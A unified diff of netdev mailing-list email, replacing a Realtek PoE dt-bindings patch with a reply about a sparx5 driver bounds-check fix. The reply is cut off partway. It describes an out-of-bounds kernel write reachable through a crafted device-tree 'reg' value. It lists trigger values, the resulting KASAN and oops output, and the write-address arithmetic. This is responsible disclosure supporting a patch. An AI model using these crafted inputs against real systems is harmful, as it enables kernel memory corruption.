@@ -1,96 +1,100 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=212.227.126.135
-ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1794830017;
-	b=P9fPmVOkpfVpPDM81w/trtQmlGxVPTnZklcLP0645fOZchNObi2pgUfwQDdM6VSCutAV
-	 1fgNCvf2ME7Fkpc0CB+vU6sp6uxm+tPvGQs40Z0Dk8x4y0JaMQVlo4SlNEFO370+3EtEW
-	 J0fOIh9U+m9n0nbk0zVUSVzkHOsoMyoWTYmKcS2iQuID/kmbW5udc9AJdS0klZ8WlmPiL
-	 hdd4znwlG91pBNACj+SPXoCd8ULZAJpahMFMvqYxQaFc7IS7L5oxO0RPDJS/I31BVroDq
-	 x8gGNqPiKc57z5jdR9L3GV7HBCHtBiIx05XAOhuMp5gfUd7WZf8kTCtObWvNVvtZ0oA==
-ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1794830017;
-	h=DMARC-Filter:DKIM2-Signature:Message-Instance:DKIM-Signature:
-	 X-UI-Sender-Class:Received:From:To:Cc:Subject:Date:Message-ID:
-	 X-Mailer:In-Reply-To:References:MIME-Version:
-	 Content-Transfer-Encoding:X-Provags-ID:X-Spam-Flag:UI-OutboundReport;
-	bh=5jgBXOT6I9cn3it3iPrPD4z/TeZ0uZFawFtLTc2JggU=;
-	b=eClQzBOJJRjMKuzSDtNZ9IqnFcHTgjfu7euFCH4LvtFl37OvMJqhJ0DqSI10DnIils9J
-	 6WTpTgG4lCvS4R0nZK9k3ER/MC1vfGpz/Lq7+GDRIK6xfTe6DDjZ3uDcww+ElpAQy5VEW
-	 NLdJAMDq8cZUWhkkfMbNe6auOWQgA/KsWBDBwapWKPG58849g8MCtoqKuRCUUrWxS7H80
-	 +DO9lVZexWHMdn7cTRN7jxrGlXPAhq1gsbbHL7hGPvYkmnQWI8MfSOWqh1fhO+nkmaPmF
-	 nvTwSxe7Ku/eyWcSkwk0N+W98THjXrfRrXcLdmv24M3AyOZ3TZHmLbrSFCVnTEb8DPQ==
-ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
-	dmarc=pass header.from=jonasjelonek.de;
-	spf=pass smtp.mailfrom=jonasjelonek.de;
-	dkim=pass header.d=jonasjelonek.de header.i=jonas@jonasjelonek.de header.a=rsa-sha256 header.s=s1-ionos header.b=yDWPsjXb;
-	arc=none smtp.remote-ip=212.227.126.135
-Received: from mout.kundenserver.de (mout.kundenserver.de [212.227.126.135])
-	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
-	 key-exchange ECDHE (prime256v1) server-signature ECDSA (prime256v1) server-digest SHA256)
+Authentication-Results: smtp.subspace.kernel.org; arc=pass header.oldest-pass=0 smtp.remote-ip=209.85.219.43
+ARC-Seal: i=2; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=pass;
+	t=1794830212;
+	b=LhZkSazN2HcEmtu38UyBWuag3XeJwbaeBKYvFu7CuLD/mZ+hna+Ijn2/vBjd+zK5WeqU
+	 vN+Y7qXhQ+Mol61M22wJ8503uFXq5+neza2XN3g7e4nbL4TZMOCcvF69BJfxcurg/RU9x
+	 6M8HOLDnepG00czAO69EXk0uTm4mhWHRFur9dyHG/0xK3NtQkiPoWm7+hwzPYO+b43RO4
+	 NiBzqBfAti5+vTeV/3NLM7v+6i9rzfiF5P9hxBv+dsEWaoNAC+Tp0FP10/LCahQpVb5zk
+	 TD8yFdGKBvCeY+GdFTXZ6QXfN3mTyDCz/ynj9WPoMER6YSis1Ud1O7uQm2pOtVkktLA==
+ARC-Message-Signature: i=2; d=subspace.kernel.org; s=arc20261015;
+	a=rsa-sha256; c=relaxed/relaxed; t=1794830212;
+	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
+	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:
+	 MIME-Version:References:In-Reply-To:From:Date:X-Gm-Features:
+	 Message-ID:Subject:To:Cc:Content-Type:Content-Transfer-Encoding;
+	bh=VeAqYU0Ni6/tgaR6G7HFYFx3hzW8VShHVNLaUWt0yPc=;
+	b=bYLw4ZFzTaPOZgSAzKhyDRBAc3SsJQub9wV/hP765XOmCTzi37xaXhtyMyqN12IL5Dtf
+	 zyhQELC0EWb2GaFo0QjTBXuXuuO4qVasMqCmmLknm0Qqf1r6f++UZ02okPVJhjcS0eweM
+	 Ey6J5QVHjyhiucdBwkfzgFLPW/pRBAQSTSyB6o4mN3gCEcuoP72a6ROTM6gyDD5NG2zq6
+	 FKCAzsKt1IsIH2sfXBYX86HcCCxV6nbbrncpNdilSJkZY323aaBHNJjEngo6S4Lb2a5d+
+	 bRi8vy8XlIPBqeRJET2jaFeEIMR3nGtzXbxUEn+BUJrEp1j4HA3OyIakP5PVpGJgyyw==
+ARC-Authentication-Results: i=2; smtp.subspace.kernel.org; 
+	dmarc=pass header.from=gmail.com;
+	spf=pass smtp.mailfrom=gmail.com;
+	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=kfzPZUSX;
+	arc=pass header.oldest-pass=0 smtp.remote-ip=209.85.219.43
+Received: from mail-qv1-f43.google.com (mail-qv1-f43.google.com [209.85.219.43])
+	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
+	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 06AE1606A32F
-	for <netdev@vger.kernel.org>; Mon, 16 Nov 2026 11:53:36 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 06AE1606A32F
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=jonasjelonek.de
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=jonasjelonek.de
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9997F606A333
+	for <netdev@vger.kernel.org>; Mon, 16 Nov 2026 11:56:51 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 9997F606A333
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key, unprotected) header.d=jonasjelonek.de header.i=jonas@jonasjelonek.de header.a=rsa-sha256 header.s=s1-ionos header.b=yDWPsjXb
-DKIM2-Signature:  i=1; m=1; t=1794830014;
- mf=PGpvbmFzQGpvbmFzamVsb25lay5kZT4=;
- rt=PG5ldGRldkB2Z2VyLmtlcm5lbC5vcmc+;
- d=jonasjelonek.de;
- s=s1-ionos:rsa-sha256:d7+pMbENS1SPSVXKQLea0A4WItlM
-   M8Ei9sdBi5te4XKMVEi4wSXItpKhOl9YcoECwUucbzS1tE6OmoKkBnacoTNuPf9GWnt3wbHK7dv
-   yV7YIS36Igjm1VRfIzcswSTxBQSsTIF/fVOUl1pcvUy0zpRv5HZutHSH4/QVuFUCaXpePQjTw0x
-   lcLTaMqzlQUmYkAB7N3JqAiPe1u/KdRjbO7htBBDZ02KV9mLmHdKRDHGV4zjERCgJKuUV0IQiLI
-   FUQPow85ENhM8IzpyT9Zh6ddKS+zUTRmuLqsIrUJ3DAMG7zDZtdBK7aYOlfOYUAVhy0eJRb688S
-   m19YiVS5L4d6EQ==;
-Message-Instance:  m=1;
- h=sha256:
-   SmYllmTEuTe6K5vTL9hYYVUWvBC4tFcKNkY0FB3DrKM=:
-   poi6KlIOGY9ZNz4PT/AsZvV9VS8szQc6Sk+YF5j4MqM=,
-  sha512:
-   DIsm+svlMaMUxmrFge5Qg1iUJJyZ/y/yMlqtP3Us4JTk1+bcY2hT0cZTCCcC83zG16ZdjaI7HyKSpVLKQlv9SQ==:
-   nCxSjFTtx5/h1SEFFArqQulim4/Z5BS+iUNl4SQ0Yev1BBW/1QS/M6FHXiKyO8m4mrZnd4lDk2lIkCaDch2n1w==;
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=jonasjelonek.de;
-	s=s1-ionos; t=1794829963; x=1795434763; i=jonas@jonasjelonek.de;
-	bh=5jgBXOT6I9cn3it3iPrPD4z/TeZ0uZFawFtLTc2JggU=;
-	h=X-UI-Sender-Class:From:To:Cc:Subject:Date:Message-ID:In-Reply-To:
-	 References:MIME-Version:Content-Transfer-Encoding:cc:
-	 content-transfer-encoding:content-type:date:from:message-id:
-	 mime-version:reply-to:subject:to;
-	b=yDWPsjXbeKyfVOmDefT84X+Wb8RQid9qDEnOxl8/6ACA9kCy5trEiqIge9lmwS+k
-	 YCZT78SdQHLwPmebIuD3taV/pOLeaKOzIObgTbrJMxvl1X4o+4aaDDfrX05edaDCO
-	 bcpYHVoRpgrUYHj53TJeRzBP7Ht85m6D/Z+OoCJl8BsgkOVRSYAH3KI/5WUjZ5/W1
-	 k5IyLuDQnPbpUGGwIhNXGAAGxITRQOpJqiVk16oScK6tVWcwu0hrwdoEonR7w1vlO
-	 JiSxL9L7rKTLft3OdJYnayF51ooMtKEe3ljOJ1VQkK7oDkegTXRt7xUSmlNX0MwTp
-	 GWT+2HHJI0gzH2qPgw==
-X-UI-Sender-Class: 55c96926-9e95-11ee-ae09-1f7a4046a0f6
-Received: from client.hidden.invalid by mrelayeu.kundenserver.de (mreue011
- [213.165.67.97]) with ESMTPSA (Nemesis) id 1M4K2r-1xTCNX3DrF-005ySw; Mon, 16
- Nov 2026 12:52:42 +0100
-From: Jonas Jelonek <jonas@jonasjelonek.de>
-To: Oleksij Rempel <o.rempel@pengutronix.de>,
-	Kory Maincent <kory.maincent@bootlin.com>,
-	Andrew Lunn <andrew+netdev@lunn.ch>,
-	"David S . Miller" <davem@davemloft.net>,
-	Eric Dumazet <edumazet@kernel.org>,
-	Jakub Kicinski <kuba@kernel.org>,
-	Paolo Abeni <pabeni@redhat.com>,
-	netdev@vger.kernel.org,
-	Rob Herring <robh@kernel.org>,
-	Krzysztof Kozlowski <krzk+dt@kernel.org>,
-	Conor Dooley <conor+dt@kernel.org>
-Cc: linux-kernel@vger.kernel.org,
-	devicetree@vger.kernel.org,
-	Sander Vanheule <sander@svanheule.net>,
-	Russell Senior <russell@personaltelco.net>,
-	Jonas Jelonek <jonas@jonasjelonek.de>
-Subject: [PATCH net-next v2 1/3] dt-bindings: net: pse-pd: realtek,pse-mcu: add VMAIN supply
-Date: Mon, 16 Nov 2026 11:52:22 +0000
-Message-ID: <20261116115224.1454885-2-jonas@jonasjelonek.de>
-X-Mailer: git-send-email 2.53.0
-In-Reply-To: <20261116115224.1454885-1-jonas@jonasjelonek.de>
-References: <20261116115224.1454885-1-jonas@jonasjelonek.de>
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=kfzPZUSX
+Received: by mail-qv1-f43.google.com with SMTP id 6a1803df08f44-91eb3fea2a9so39556946d6.3
+        for <netdev@vger.kernel.org>; Mon, 16 Nov 2026 03:56:51 -0800 (PST)
+ARC-Seal: i=1; a=rsa-sha256; t=1794830210; cv=none;
+        d=google.com; s=arc-20260327;
+        b=Ta7fEudX49S2mRz6vSmnYnREtdCVwBR3UZYFpbcCLfgfisB9pHNFTl5KPT7wlpWcE4
+         JOaA9vKX/k4P8OnAPXxihvjNpD2CRnwNxrIPFoMWfHHzU3y9xW49g3jOXqVtcfxVYaDH
+         vny0kb2xc00zJpj0A2FFatDWMX2NfXAnSKQAfSunYjjqRbf2jG5pvd4JGvTwgatgcAMc
+         sYYj2/Q60HNWV4GSGROWJ8EtdqN+8i2mORY00Er+44DsEbBdxY7SLMP7YiEO5y4wgSqr
+         rDXMQ/acjZfDl0XlxIiOFNBpYlBg78KCx15dWkM76N+5Pu2SAQTNZgZ1tOW7RZYQrW5X
+         v2gA==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :in-reply-to:references:mime-version:dkim-signature;
+        bh=VeAqYU0Ni6/tgaR6G7HFYFx3hzW8VShHVNLaUWt0yPc=;
+        fh=Gg388jwiLTZKTpRECLsUAcmmVwO+HQBoDcLoiXTRWhc=;
+        b=aoMkK+PEXXhqCXu/48MjuLVZBryhPUnOKZiwNoGFm+K/WdlEibR0M1/cw82m7mxxeS
+         BRUlEVoJ2jQoc1CvFpZ52KER81qJZFiL5S5khZBWti87ntaTof2pYILkABJCS/yQK0EB
+         ++PapZOabdEzxeGfrD9Q5lPuezry8W4+1E3pa+r8pbqQ6HWknIAmPk0ub/r2Wi3jOYFf
+         wvXKzfA1yLCnN/l3cUJy4vNON1t5SLB2iaIWwqKzf2Qot2A6S/EmAmXwKVsH1wrJyUz6
+         875LTl7w9NvwQFDUCqJpMPCwDveQadZthf2ELTzNE5Ukif3mN0FnHntFScqViyoec6BF
+         WGzw==;
+        darn=vger.kernel.org
+ARC-Authentication-Results: i=1; mx.google.com; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20260707; t=1794830210; x=1795435010; darn=vger.kernel.org;
+        h=content-transfer-encoding:content-type:cc:to:subject:message-id
+         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
+         :date:message-id:reply-to:content-type;
+        bh=VeAqYU0Ni6/tgaR6G7HFYFx3hzW8VShHVNLaUWt0yPc=;
+        b=kfzPZUSX8jIIGFZhcToE9LJqzWlOzp+4a/E1BMV85V2Xk01Wk/y9ZeYHQ1bEBOBue+
+         ARvBPMSWAQbjI21ZvA1Pb42rtiPxg/fwI2j2i92FmWh8PxRsMVDwh+QhEGZJ4+ZI26kR
+         OBC+2glWzilbK75OxI6HNAlKGVDuD2qj7dWXIemlt1RSoTarfvNtwAlRbfIE5YynCuUC
+         TOKoys7e/PesUtTP5fybp6phEmAtJm6L6YXM2kKCbdPuMihcAyLE5dcVSBlirztB5MB4
+         +YRjBU/srjL+t4DUGauMiQiyigTM5ZhpUZodyPOdb4VzcJfjB1gE2qFBd6n08DLClwOp
+         7JNw==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1794830210; x=1795435010;
+        h=content-transfer-encoding:content-type:cc:to:subject:message-id
+         :date:from:in-reply-to:references:mime-version:x-gm-gg
+         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
+         :content-type;
+        bh=VeAqYU0Ni6/tgaR6G7HFYFx3hzW8VShHVNLaUWt0yPc=;
+        b=YlkYcNENtpodwPUNiP1UNdUrrumQfJ8JOqZE149CfvWxRMeUaRCIZ7CtZ4gfpPdun9
+         sf+cywWgU9W1hNLlrcGaRi8mAIRh+AsBC1sam3gZfdA4uHFe6MaTaHzO2zfh9D1IZ4R6
+         y77AaSuL5BgMxGJq7Y7f97/fTnsCjg+/VXmdZ2Rph1/gHnqswyppuGb/llGyETT9qBYe
+         mCNlNDzcp/aLXCbp4fBdIxVAzwC6Gewub1AfZWIE2w3LvNkfBag6LeRzxonEmivRZtBS
+         bfvZjoRm5Wi7pDaPchG+vTaCG6G8KP9ObUADAhUSo8O91AMLyHNs6DRE2iSGenmvkd4L
+         vmAA==
+X-Forwarded-Encrypted: i=1; AL+hErEW9z6NCxHBmorqQwHEpbu6eneFwO7xg2IgKgF+7Xxqr7/pH4+3b9nYGrrGp1J0GDfC00UatLM=@vger.kernel.org
+X-Gm-Message-State: APuU4Z9l5nxzaFtzVh5ae9lsfqhkF6RuBS4nEmjhMj1q+aWZR44n7MKU
+	jJH4SViPCFS/GKVkS20UDmSBn2EGuHERILNJ+iXwsjdDQtodQpTNN/S8hyCJMe2ZAwYJ1E+nWVL
+	oYj4DHG1c0zavD0iWqZ8GW+8HpYSLVnY=
+X-Gm-Gg: AZFdTZc54h45stIZbJDETDEwHSP+0w2KugYL8rQ7JvvvM6vXhWthJTp8dCMPXd3RNg9
+	eqSzBDy+24KF0ON0mrDTvu9WHmVll4u14kVnhc70+a+vv65q35gOuESQ+03cxYbR6rD8GwLgZHO
+	1BKqsZAR4RbV0CwIxeKpaqh3XmicyDeqtp6x1nCs+AK7t28Ql9umRWvll9Ro6ffc8GBCl0mutwX
+	RRuTAJcifp7VgsZhTKeVN2KsmjWntjA//vs1DkUjBWXk5B17pWYmsWc38CfjXBpuNQt2DhFhytS
+	9uZ1SHDEAavirS9QlmKYgnb5pqpfeTl0JhGThOTiQ89p153S9L9LeZt6Rg3Sx9ytR2Qm/4tTO24
+	Rn+E7tvI72de7Fn3ex7hyZlMWPuOBWb2wmw9xU8pxQJHIGrWvwJzbssbS25Nt
+X-Received: by 2002:a05:6214:5907:b0:91f:ca0:8131 with SMTP id
+ 6a1803df08f44-91f24110625mr157089866d6.17.1794830210043; Mon, 16 Nov 2026
+ 03:56:50 -0800 (PST)
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Post: <mailto:netdev@vger.kernel.org>
@@ -100,114 +104,1086 @@ List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 List-Owner: <mailto:netdev+owner@vger.kernel.org>
 Precedence: list
 MIME-Version: 1.0
+References: <179457014579.23820.10657909253312598784@gmail.com> <20261115221342.nlrfhxlg4ovyaq7i@DEN-DL-M70577>
+In-Reply-To: <20261115221342.nlrfhxlg4ovyaq7i@DEN-DL-M70577>
+From: Wang Haoran <haoranwangsec@gmail.com>
+Date: Mon, 16 Nov 2026 19:56:38 +0800
+X-Gm-Features: Aa3M54olKm2SWNkrOXaXI7bRsq2d5YJmHevLU5-KXSw8CEpQKDxh3bqJNY3dRQU
+Message-ID: <CANZ3JQRTCKSkKG502GEMs1B4MB929bgvsXPyStE5o0q4op4DiQ@mail.gmail.com>
+Subject: Re: [PATCH net-next] net: sparx5: check DT port reg against array size
+To: Daniel Machon <daniel.machon@microchip.com>
+Cc: Steen.Hegelund@microchip.com, UNGLinuxDriver@microchip.com, 
+	netdev@vger.kernel.org, linux-arm-kernel@lists.infradead.org, 
+	linux-kernel@vger.kernel.org
+Content-Type: text/plain; charset="UTF-8"
 Content-Transfer-Encoding: quoted-printable
-X-Provags-ID: V03:K1:a/yok3CJ549/7WlG9ojllLiYyj2VOq/NSDHh2GVuH+6sRGAJ0l/
- w6VqQvh8IEBD3Pvmeo3YoYXasymimI2Si5SWZ1LVDjvArwShQ0d/UhuFEvVJCYA/n/5kZxa
- 3F7jJPaQnK//JD781elQJPsmD75/IftfAnl1C7O/AoI2aaoWb6PrvCsYL6Y5F/wOa4IK0kB
- y3U/dYf9YRLsU6XcgznpA==
-X-Spam-Flag: NO
-UI-OutboundReport: notjunk:1;M01:P0:zTmmW7wXkoE=;EnJoXBXHceyw04/aNBLhBX60udp
- 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
 
-Describe the VMAIN supply at the MCU controller level. The rail feeds the
-PoE subsystem as a whole rather than an individual PI. Its regulator power
-budget defines the aggregate limit programmed into the MCU.
+Hi Daniel,
 
-Require a finite regulator power budget dedicated to this MCU, representin=
-g
-the PoE power allocation of the system. The rail is available independentl=
+Thanks for the review.
+
+Answering the bot's questions first:
+
+* How was this found: static analysis. I ran a script over all
+  of_property_read_u32() call sites whose value is later used as a
+  fixed-size array index (2708 call sites -> 84 candidates, each then
+  reviewed manually in source). The sparx5 portno store in
+  sparx5_create_port() came out of that scan.
+
+* Was it triggered: yes. On a pristine v7.4-rc2 arm64 QEMU 'virt'
+  machine with generic inline KASAN and CONFIG_SPARX5_SWITCH=3Dm,
+  using an out-of-tree module that only supplies the malicious
+  device-tree input:
+
+    reg =3D 15839       BUG: KASAN: use-after-free in mchp_sparx5_probe,
+                      Write of size 8 at the first byte past the
+                      order-5 allocation backing struct sparx5
+                      (deterministic)
+    reg =3D 0x20000000  wild write 4 GiB out -> "Unable to handle kernel
+                      paging request" oops in mchp_sparx5_probe
+    reg =3D 65          silent corruption of the struct members past
+                      ports[], later WARNING + NULL-pointer write oops
+                      in sparx5_port_init
+
+  With the patch all three inputs are rejected during DT parsing and
+  probe completes normally for the valid ports. Full PoC and console
+  logs are at the bottom of this mail.
+
+* Hardware: no real SparX-5 board available. Testing was QEMU virt
+  (cortex-a57) plus compile testing.
+
+On the "device tree is considered trusted" question: that was my
+concern as well, which is why I first checked what the rest of the
+tree does: 52 of the 84 candidate sites the scan surfaced already
+carry exactly this style of bounds check (a ">=3D ARRAY_SIZE(x)" or
+">=3D num_x" test before the store). And lan966x_probe_port() in the
+same driver family does the same check on its fwnode path, so I
+followed that precedent. Happy to drop the patch if you would rather
+treat the DT as trusted here.
+
+A v2 follows with the check against sparx5->data->consts->n_ports as
+you suggested (lan969x has n_ports =3D 30 and goes through this same
+probe), the information above in the commit message, and a
+get_maintainers.pl CC list.
+
+The rest of this mail is the PoC and verification detail.
+
+1. Impact summary
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+The write address is alloc_base + 0x1088 + portno * 8 with portno an
+arbitrary u32 taken from the DT 'reg' property (up to a 2 GiB
+displacement). Verified on the clean kernel:
+
+  reg value  write lands at                              observed result
+  ---------  ------------------------------------------
+--------------------------
+  65         first slot past ports[], still inside       silent corruption =
+of
+             struct sparx5 (coreclock/stats fields)     coreclock/stats, la=
+ter
+                                                        WARNING + NULL-poin=
+ter
+                                                        write oops in
+                                                        sparx5_port_init
+  15839      first byte past the 128 KiB (order-5)       BUG: KASAN:
+             allocation backing struct sparx5           use-after-free in
+                                                        mchp_sparx5_probe,
+                                                        deterministic
+  0x20000000 linear-map address +4 GiB                   Unable to handle
